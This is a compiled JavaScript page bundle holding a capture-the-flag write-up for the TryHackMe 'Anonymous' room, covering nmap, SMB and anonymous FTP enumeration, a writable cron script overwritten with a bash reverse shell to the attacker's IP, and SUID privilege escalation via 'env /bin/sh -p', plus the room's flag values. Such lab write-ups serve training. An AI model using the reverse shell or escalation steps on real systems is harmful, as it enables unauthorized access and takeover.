"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[9582],{3905:(n,e,t)=>{t.d(e,{Zo:()=>l,kt:()=>f});var r=t(67294);function s(n,e,t){return e in n?Object.defineProperty(n,e,{value:t,enumerable:!0,configurable:!0,writable:!0}):n[e]=t,n}function o(n,e){var t=Object.keys(n);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(n);e&&(r=r.filter((function(e){return Object.getOwnPropertyDescriptor(n,e).enumerable}))),t.push.apply(t,r)}return t}function a(n){for(var e=1;e<arguments.length;e++){var t=null!=arguments[e]?arguments[e]:{};e%2?o(Object(t),!0).forEach((function(e){s(n,e,t[e])})):Object.getOwnPropertyDescriptors?Object.defineProperties(n,Object.getOwnPropertyDescriptors(t)):o(Object(t)).forEach((function(e){Object.defineProperty(n,e,Object.getOwnPropertyDescriptor(t,e))}))}return n}function i(n,e){if(null==n)return{};var t,r,s=function(n,e){if(null==n)return{};var t,r,s={},o=Object.keys(n);for(r=0;r<o.length;r++)t=o[r],e.indexOf(t)>=0||(s[t]=n[t]);return s}(n,e);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(n);for(r=0;r<o.length;r++)t=o[r],e.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(n,t)&&(s[t]=n[t])}return s}var u=r.createContext({}),c=function(n){var e=r.useContext(u),t=e;return n&&(t="function"==typeof n?n(e):a(a({},e),n)),t},l=function(n){var e=c(n.components);return r.createElement(u.Provider,{value:e},n.children)},p="mdxType",m={inlineCode:"code",wrapper:function(n){var e=n.children;return r.createElement(r.Fragment,{},e)}},d=r.forwardRef((function(n,e){var t=n.components,s=n.mdxType,o=n.originalType,u=n.parentName,l=i(n,["components","mdxType","originalType","parentName"]),p=c(t),d=s,f=p["".concat(u,".").concat(d)]||p[d]||m[d]||o;return t?r.createElement(f,a(a({ref:e},l),{},{components:t})):r.createElement(f,a({ref:e},l))}));function f(n,e){var t=arguments,s=e&&e.mdxType;if("string"==typeof n||s){var o=t.length,a=new Array(o);a[0]=d;var i={};for(var u in e)hasOwnProperty.call(e,u)&&(i[u]=e[u]);i.originalType=n,i[p]="string"==typeof n?n:s,a[1]=i;for(var c=2;c<o;c++)a[c]=t[c];return r.createElement.apply(null,a)}return r.createElement.apply(null,t)}d.displayName="MDXCreateElement"},8151:(n,e,t)=>{t.r(e),t.d(e,{assets:()=>u,contentTitle:()=>a,default:()=>m,frontMatter:()=>o,metadata:()=>i,toc:()=>c});var r=t(87462),s=(t(67294),t(3905));const o={},a="Anonymous",i={unversionedId:"Tryhackme/Anonymous/Anonymous",id:"Tryhackme/Anonymous/Anonymous",title:"Anonymous",description:"Not the hacking group",source:"@site/writeups/Tryhackme/Anonymous/Anonymous.md",sourceDirName:"Tryhackme/Anonymous",slug:"/Tryhackme/Anonymous/",permalink:"/writeups/Tryhackme/Anonymous/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Anonforce",permalink:"/writeups/Tryhackme/Anonforce/"},next:{title:"Anonymous Playground",permalink:"/writeups/Tryhackme/Anonymous Playground/"}},u={},c=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Pwn",id:"task-1-pwn",level:2},{value:"Try to get the two flags! Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods.",id:"try-to-get-the-two-flags-root-the-machine-and-prove-your-understanding-of-the-fundamentals-this-is-a-virtual-machine-meant-for-beginners-acquiring-both-flags-will-require-some-basic-knowledge-of-linux-and-privilege-escalation-methods",level:2}],l={toc:c},p="wrapper";function m(n){let{components:e,...t}=n;return(0,s.kt)(p,(0,r.Z)({},l,t,{components:e,mdxType:"MDXLayout"}),(0,s.kt)("h1",{id:"anonymous"},"Anonymous"),(0,s.kt)("p",null,"Not the hacking group"),(0,s.kt)("p",null,(0,s.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/anonymous"},"Anonymous")),(0,s.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,s.kt)("ul",null,(0,s.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,s.kt)("li",{parentName:"ul"},"SMB Enumeration"),(0,s.kt)("li",{parentName:"ul"},"FTP Enumeration"),(0,s.kt)("li",{parentName:"ul"},"Security Misconfiguration"),(0,s.kt)("li",{parentName:"ul"},"Abusing SUID/GUID")),(0,s.kt)("hr",null),(0,s.kt)("h2",{id:"task-1-pwn"},"Task 1 Pwn"),(0,s.kt)("h2",{id:"try-to-get-the-two-flags-root-the-machine-and-prove-your-understanding-of-the-fundamentals-this-is-a-virtual-machine-meant-for-beginners-acquiring-both-flags-will-require-some-basic-knowledge-of-linux-and-privilege-escalation-methods"},"Try to get the two flags! Root the machine and prove your understanding of the fundamentals! This is a virtual machine meant for beginners. Acquiring both flags will require some basic knowledge of Linux and privilege escalation methods."),(0,s.kt)("p",null,"For more information on Linux, check out Learn Linux"),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Anonymous$ sudo nmap -p- -sS -sC -sV -Pn -O 10.10.202.0\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-09 15:47 CEST\nNmap scan report for 10.10.202.0\nHost is up (0.039s latency).\nNot shown: 65531 closed ports\nPORT    STATE SERVICE     VERSION\n21/tcp  open  ftp         vsftpd 2.0.8 or later\n| ftp-anon: Anonymous FTP login allowed (FTP code 230)\n|_drwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts [NSE: writeable]\n| ftp-syst:\n|   STAT:\n| FTP server status:\n|      Connected to ::ffff:10.8.106.222\n|      Logged in as ftp\n|      TYPE: ASCII\n|      No session bandwidth limit\n|      Session timeout in seconds is 300\n|      Control connection is plain text\n|      Data connections will be plain text\n|      At session startup, client count was 2\n|      vsFTPd 3.0.3 - secure, fast, stable\n|_End of status\n22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 8b:ca:21:62:1c:2b:23:fa:6b:c6:1f:a8:13:fe:1c:68 (RSA)\n|   256 95:89:a4:12:e2:e6:ab:90:5d:45:19:ff:41:5f:74:ce (ECDSA)\n|_  256 e1:2a:96:a4:ea:8f:68:8f:cc:74:b8:f0:28:72:70:cd (ED25519)\n139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\n445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/9%OT=21%CT=1%CU=34983%PV=Y%DS=2%DC=I%G=Y%TM=5F806D0\nOS:5%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS\nOS:(O1=M508ST11NW6%O2=M508ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST1\nOS:1NW6%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN\nOS:(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A\nOS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R\nOS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F\nOS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%\nOS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD\nOS:=S)\n\nNetwork Distance: 2 hops\nService Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nHost script results:\n|_nbstat: NetBIOS name: ANONYMOUS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)\n| smb-os-discovery:\n|   OS: Windows 6.1 (Samba 4.7.6-Ubuntu)\n|   Computer name: anonymous\n|   NetBIOS computer name: ANONYMOUS\\x00\n|   Domain name: \\x00\n|   FQDN: anonymous\n|_  System time: 2020-10-09T14:00:35+00:00\n| smb-security-mode:\n|   account_used: guest\n|   authentication_level: user\n|   challenge_response: supported\n|_  message_signing: disabled (dangerous, but default)\n| smb2-security-mode:\n|   2.02:\n|_    Message signing enabled but not required\n| smb2-time:\n|   date: 2020-10-09T14:00:35\n|_  start_date: N/A\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 794.23 seconds\n")),(0,s.kt)("ol",null,(0,s.kt)("li",{parentName:"ol"},"Enumerate the machine. How many ports are open?")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"4")),(0,s.kt)("ol",{start:2},(0,s.kt)("li",{parentName:"ol"},"What service is running on port 21?")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"FTP")),(0,s.kt)("ol",{start:3},(0,s.kt)("li",{parentName:"ol"},"What service is running on ports 139 and 445?")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"SMB")),(0,s.kt)("ol",{start:4},(0,s.kt)("li",{parentName:"ol"},"There's a share on the user's computer. What's it called?")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Anonymous$ smbclient -L 10.10.202.0\nEnter WORKGROUP\\kali's password:\n\n        Sharename       Type      Comment\n        ---------       ----      -------\n        print$          Disk      Printer Drivers\n        pics            Disk      My SMB Share Directory for Pics\n        IPC$            IPC       IPC Service (anonymous server (Samba, Ubuntu))\nSMB1 disabled -- no workgroup available\n")),(0,s.kt)("p",null,(0,s.kt)("inlineCode",{parentName:"p"},"pics")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Anonymous$ ftp 10.10.202.0\nConnected to 10.10.202.0.\n220 NamelessOne's FTP Server!\nName (10.10.202.0:kali): anonymous\n331 Please specify the password.\nPassword:\n230 Login successful.\nRemote system type is UNIX.\nUsing binary mode to transfer files.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxr-xr-x    3 65534    65534        4096 May 13 19:49 .\ndrwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..\ndrwxrwxrwx    2 111      113          4096 Jun 04 19:26 scripts\n226 Directory send OK.\nftp> cd scripts\n250 Directory successfully changed.\nftp> ls -la\n200 PORT command successful. Consider using PASV.\n150 Here comes the directory listing.\ndrwxrwxrwx    2 111      113          4096 Jun 04 19:26 .\ndrwxr-xr-x    3 65534    65534        4096 May 13 19:49 ..\n-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh\n-rw-rw-r--    1 1000     1000         1677 Oct 09 14:05 removed_files.log\n-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt\n226 Directory send OK.\nftp> mget *\nmget clean.sh?\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for clean.sh (314 bytes).\n226 Transfer complete.\n314 bytes received in 0.01 secs (23.7063 kB/s)\nmget removed_files.log?\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for removed_files.log (1677 bytes).\n226 Transfer complete.\n1677 bytes received in 0.00 secs (2.8973 MB/s)\nmget to_do.txt?\n200 PORT command successful. Consider using PASV.\n150 Opening BINARY mode data connection for to_do.txt (68 bytes).\n226 Transfer complete.\n68 bytes received in 0.00 secs (84.8100 kB/s)\nftp> exit\n221 Goodbye.\n")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre",className:"language-sh"},'#!/bin/bash\nbash -i >& /dev/tcp/10.8.106.222/4444 0>&1\n\n# tmp_files=0\n# echo $tmp_files\n# if [ $tmp_files=0 ]\n# then\n#         echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log\n# else\n#     for LINE in $tmp_files; do\n#         rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done\n# fi\n#\n')),(0,s.kt)("ol",{start:5},(0,s.kt)("li",{parentName:"ol"},"user.txt")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"namelessone@anonymous:~$ cat user.txt\ncat user.txt\n90d6f992585815ff991e68748c414740\n")),(0,s.kt)("ol",{start:6},(0,s.kt)("li",{parentName:"ol"},"root.txt")),(0,s.kt)("pre",null,(0,s.kt)("code",{parentName:"pre"},"namelessone@anonymous:~$ find / -user root -perm -u=s 2>/dev/null\nfind / -user root -perm -u=s 2>/dev/null\n/snap/core/8268/bin/mount\n/snap/core/8268/bin/ping\n/snap/core/8268/bin/ping6\n/snap/core/8268/bin/su\n/snap/core/8268/bin/umount\n/snap/core/8268/usr/bin/chfn\n/snap/core/8268/usr/bin/chsh\n/snap/core/8268/usr/bin/gpasswd\n/snap/core/8268/usr/bin/newgrp\n/snap/core/8268/usr/bin/passwd\n/snap/core/8268/usr/bin/sudo\n/snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core/8268/usr/lib/openssh/ssh-keysign\n/snap/core/8268/usr/lib/snapd/snap-confine\n/snap/core/8268/usr/sbin/pppd\n/snap/core/9066/bin/mount\n/snap/core/9066/bin/ping\n/snap/core/9066/bin/ping6\n/snap/core/9066/bin/su\n/snap/core/9066/bin/umount\n/snap/core/9066/usr/bin/chfn\n/snap/core/9066/usr/bin/chsh\n/snap/core/9066/usr/bin/gpasswd\n/snap/core/9066/usr/bin/newgrp\n/snap/core/9066/usr/bin/passwd\n/snap/core/9066/usr/bin/sudo\n/snap/core/9066/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/snap/core/9066/usr/lib/openssh/ssh-keysign\n/snap/core/9066/usr/lib/snapd/snap-confine\n/snap/core/9066/usr/sbin/pppd\n/bin/umount\n/bin/fusermount\n/bin/ping\n/bin/mount\n/bin/su\n/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic\n/usr/lib/dbus-1.0/dbus-daemon-launch-helper\n/usr/lib/snapd/snap-confine\n/usr/lib/policykit-1/polkit-agent-helper-1\n/usr/lib/eject/dmcrypt-get-device\n/usr/lib/openssh/ssh-keysign\n/usr/bin/passwd\n/usr/bin/env\n/usr/bin/gpasswd\n/usr/bin/newuidmap\n/usr/bin/newgrp\n/usr/bin/chsh\n/usr/bin/newgidmap\n/usr/bin/chfn\n/usr/bin/sudo\n/usr/bin/traceroute6.iputils\n/usr/bin/pkexec\nnamelessone@anonymous:~$ env /bin/sh -p\nenv /bin/sh -p\n\nwhoami\nroot\ncd /root\ncat root.txt\n4d930091c31a622a7ed10f27999af363\n")))}m.isMDXComponent=!0}}]);